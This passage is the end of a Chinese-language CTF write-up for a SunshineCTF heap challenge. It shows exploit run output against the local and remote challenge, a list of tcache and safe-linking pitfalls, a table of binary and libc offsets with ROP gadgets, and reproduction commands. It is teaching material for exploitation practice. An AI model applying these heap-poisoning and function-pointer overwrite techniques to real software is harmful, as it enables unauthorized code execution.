drwxr-xr-x 10 kzzz kzzz    4096 Sep 28 00:14 ..
... （ls -la 的其餘行省略）
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE
HQ▒▒▒M▒t▒u▒▒Y0▒▒▒▒G▒`J▒▒▒▒-6▒ Z▒        ← ★ 見下方說明（cmd 0x15 的回音）
2-\▒▒▒▒▒▒▒▒▒▒▒P▒▒▒▒P▒▒▒▒  ▒
FLAG: sun{local_test_flag}
[*] local test flag -> FLAG.txt left untouched
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2' (pid 3544661)
```

> 💡 **新手最常以為「我跑壞了」的四件事**
> 1. 前兩行 `[x] Starting local process ...` / `[+] Starting local process ...: pid NNNN`
>    是 **pwntools** 印的，不是程式輸出。
> 2. `[+] victim P (malloc user ptr) = ...` 的 `P` 是 **`malloc` 回傳的 user 位址**（不是 chunk 標頭，
>    標頭是 `P - 0x10`，見 §3.5 (1) 與 §4.3）。
> 3. **`DONE` 後面那一大串非 ASCII 亂碼是正常的**：`cmd 0x15` 的處理器在呼叫完
>    `[0x40c0]` 之後，還會把「收到的 cmd 內容」加密後回音一次（§2.11 的 1a50~1a71），
>    所以 socket 上一定會有這串二進位。它不影響 flag。
>    討厭看到它的話：`python3 exploit.py | tr -d '\000'`（本筆記就是這樣截的）。
> 4. 本地測試**不會**覆蓋 `FLAG.txt`（`[*] local test flag -> FLAG.txt left untouched`）——
>    不然打過遠端再跑本地就會把真 flag 蓋掉。

### 8.2 遠端（`python3 exploit.py REMOTE` → `chal.sunshinectf.games:26005`）

```
[x] Opening connection to chal.sunshinectf.games on port 26005
[x] Opening connection to chal.sunshinectf.games on port 26005: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26005: Done
[+] handshake ok, key schedule = bff3be995bde2cb4802912e5a4d6ee70
[+] PIE base = 0x5de6e835c000
[*] target function pointer @ 0x5de6e83600c0  ->  system@plt 0x5de6e835d150
[+] heap leak: stored_next=0x5de2c80773e1 tcache_key=0xa5cac8477d07e250
[+] victim P (malloc user ptr) = 0x5de716761480
[+] wrote system@plt into <0x5de6e83600c0>
[+] verified: [0x5de6e83600c0] == 0x5de6e835d150
[*] triggering system(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
total 12
drwxr-xr-x 2 root root         4096 Sep 26 00:21 .
drwxr-xr-x 1 root root         4096 Sep 26 00:54 ..
-rw-r----- 1 root code_breaker   36 Sep 26 00:13 flag.txt
uid=1337(code_breaker) gid=1337(code_breaker) groups=1337(code_breaker)
DONE
HQ▒▒▒▒M t▒u▒▒Y0▒▒p▒▒▒G▒`J▒▒▒▒▒▒-6▒ Z▒    ← ★ 同一串二進位回音（見 §8.1 說明）
2-\▒▒▒▒▒▒▒▒▒▒▒P▒▒▒▒P▒▒▒▒  ▒
FLAG: sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
[*] Closed connection to chal.sunshinectf.games port 26005
```

> 💡 遠端連線 pwntools 也會印「兩行」：`[x] ... Trying 35.211.211.18`（開始嘗試）
> 與 `[+] ... Done`（成功）。只看到一行不代表只做了一次動作。

### 8.3 真實 flag

```
sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
```

（也存成 `FLAG.txt`。用 `re.search(rb'sun\{[^}]*\}', out)` 從輸出中撈出來。）

---

## 9. 常見坑（我這次真的踩到的都列出來）

1. **`__memcpy_chk` 會 abort**
   `__memcpy_chk(dest, src, n, destlen)`：只要 `n > destlen` 就呼叫
   `__chk_fail` → `abort()`。它**不會**幫你擋「dest 實際比 destlen 小」的情況，
   所以 destlen 常常是編譯器寫死的常數（本題 cmd 0x15 寫 `0x1000`、cmd 0x10 寫 `size`）。
   看到它就先確認「destlen 是不是跟真正的緩衝區一樣大」。

2. **`movaps` / 16-byte 對齊**
   ROP 時 `rsp` 沒對齊會死在 libc 的 `movaps`；解法是在 chain 前面多放一個 `ret`。
   本題走函式指標覆寫，天然對齊，不用管。

3. **bundled libc 與系統 ld 不相容**
   `./code_breaker` 直接跑會出現
   `undefined symbol: __nptl_change_stack_perm, version GLIBC_PRIVATE`。
   一定要用題目的 ld：`./ld-linux-x86-64.so.2 --library-path . ./code_breaker`。

4. **`$ORIGIN` RUNPATH 只是「去哪裡找」**
   它不會改變「用哪個 interpreter」。`patchelf --set-interpreter` 也可以（要先備份）。

5. **`/dev/urandom` 的 `fread` 短讀**
   本題有檢查 `cmp rax,0x10; jne 失敗`，所以沒有「nonce 沒讀到 ⇒ 用殘留 stack」的漏洞。
   這是**檢查過但不存在**的候選漏洞（順便學到：`fopen("/dev/urandom","r")` 在某些環境
   用 text mode 開、以及 `fread` 的參數順序 `(ptr, size, nmemb, fp)` 都值得看）。

6. **`tcache_key` 不是指標（glibc ≥ 2.34）**
   舊教學會說「free 後 chunk+8 是 `tcache` 指標，可以直接洩漏 heap base」。
   2.34+ 之後那裡是**隨機值**，別被騙。本題改用 safe-linking 的自我參照式解出 heap。

7. **safe-linking 別忘了 encode/decode**
   寫入 tcache `next` 時要寫 `target ^ (P >> 12)`，不是 `target`；否則會拿到歪掉的指標，
   通常表現為 `malloc(): unaligned tcache chunk detected` 或直接 SIGSEGV。

8. **`tcache_get` 會要求 16-byte 對齊**
   假目標位址必須 16 對齊（本題 `PIE+0x40c0` 剛好是）。

9. **協定的兩個「反直覺」細節**（我卡最久的地方）
   - 長度前綴與 size 欄位都是 **big-endian**。
   - 加密用的 `K` 索引是 **訊息內的** `i & 0xf`，不是絕對 offset。
     寫錯的話「第一封訊息（counter=0）」會完全正常，**之後才開始爛**，非常難查。

10. **pwntools 會偷走 `sys.argv` 裡的魔法參數**
    `from pwn import *` 會把 `REMOTE`、`DEBUG` 這類參數從 `sys.argv` 移除，
    改放到 `args['REMOTE']`。所以
    `if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE'` **永遠是 False**！
    要用 `if args['REMOTE']:`（本題 exploit.py 兩種都支援）。

11. **`p16(x, 'big')` 不是 big-endian！**
    pwntools 的 `p16` 第二個「位置參數」不是 endianness，`p16(1,'big')` 會給你
    `\x01\x00`（little）。一定要寫成 **`p16(x, endian='big')`**。
    （我因此浪費了一輪 debug，症狀是「指令一直被拒絕，但錯誤碼看起來很合理」。）

12. **不要用互動式 `/bin/sh`**
    實測：`cmd 0x15` 送 `/bin/sh\0` 之後，shell 的 stdin 行為在某些環境下會直接結束
    （拿不到輸出）。**更穩的做法**是把整條命令一次交給 `system()`：
    `cmd 0x15 + b'cat flag.txt /flag ...; id; echo DONE'`，
    這樣不需要 TTY、不需要等待 shell 提示字元，輸出直接出現在 socket 上。

13. **canary 檢查失敗的症狀是 `abort()`，不是 SIGSEGV**
    看到 `*** stack smashing detected ***` 就代表你動到 canary 了。

---

## 附錄 A：重要 offset 一覽（全部已驗證）

```
PIE 相對 offset
  0x1150  system@plt                    （GOT 項在 0x4028）
  0x1390  endbr64; ret（stub，[0x40c0] 的初值）
  0x11c0  main
  0x1170  __memcpy_chk@plt
  0x1140  __stack_chk_fail@plt
  0x13a0  read_exact(fd 0)
  0x13f0  recv_message(len-prefixed)
  0x1450  send_message(len-prefixed, 明文)
  0x1510  send_message(加密)
  0x1670  handshake（nonce 交換 + 金鑰排程 + MAC 驗證）
  0x1900  指令主迴圈
  0x1a00  cmd 0x15：call [0x40c0](我們送的字串)      ★ 觸發點
  0x1a80  cmd 0x14：clone（refcount bug）             ★ 漏洞
  0x1ae8  cmd 0x13：free
  0x1b40  cmd 0x12：write（受 slot.size 限制）
  0x1bc0  cmd 0x11：read（UAF read）
  0x1c50  cmd 0x10：alloc
  0x1d08  cmd 0x16：dump 0x40c0..0x41b0（PIE leak）
  0x2040  S-box（256 bytes）
  0x2020  jump table（指令 0x10~0x16）
  0x2006  "/dev/urandom"   0x2004 "r"   0x2013 "true"

.bss
  0x40c0  被 cmd 0x15 呼叫的函式指標  ★ 攻擊目標
  0x41c0  slot[16]（每個 0x10 bytes：ptr/size/refcount）
  0x42c0  收方 stream counter
  0x42c4  送方 stream counter
  0x42d0  K[16]

libc（題目附的 2.39）
  system     0x58740
  "/bin/sh"  0x1cb42f
  pop rdi;ret 0x10f75b      ret 0x2882f
```

## 附錄 B：重現指令

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn6
printf 'sun{local_test_flag}\n' > flag.txt      # 本機 dummy flag
python3 exploit.py | tr -d '\000'               # 打本機（過濾掉結尾的二進位回音）
python3 exploit.py REMOTE | tr -d '\000'        # 打 chal.sunshinectf.games:26005
cat FLAG.txt                                    # 真實 flag
```

- 本機測試**不會覆蓋** `FLAG.txt`：exploit 只在「非本地 dummy flag」或「`REMOTE` 模式」時
  才寫檔（訊息：`[*] local test flag -> FLAG.txt left untouched`）。所以
  「先打遠端、後跑本地」不會把真 flag 蓋掉。
- 用 `tr -d '\000'` 只是讓輸出好看一點；不過濾也拿得到 flag（那個二進位回音見 §8.1）。

### 重現 §4.3 的 safe-linking gdb 實測

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn6
cat > /tmp/tr2.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(void){
    void *P = malloc(0x80);
    memset(P, 'A', 0x80);
    free(P);                 /* free #1 */
    printf("state-a\n");     /* ← 中斷點 1（第 8 行） */
    memset(P, 0, 16);        /* UAF write：清 next + key */
    free(P);                 /* free #2：double free */
    printf("state-b\n");     /* ← 中斷點 2（第 11 行） */
    return 0;
}
EOF
gcc -O0 -g -o /tmp/tr2 /tmp/tr2.c
cp /tmp/tr2 /tmp/tr2_p
patchelf --set-interpreter "$PWD/ld-linux-x86-64.so.2" --set-rpath "$PWD" /tmp/tr2_p
gdb -q -batch -ex 'break /tmp/tr2.c:8' -ex 'break /tmp/tr2.c:11' -ex 'run' \
  -ex 'printf "P=%p P>>12=%#lx\n", P, (unsigned long)P>>12' \
  -ex 'x/2gx P' -ex 'continue' -ex 'x/2gx P' /tmp/tr2_p
```

期望看到：第一次 `x/2gx P` 的 `next` 等於 `P>>12`，第二次等於 `P ^ (P>>12)`
（完整實測值見 §4.3）。
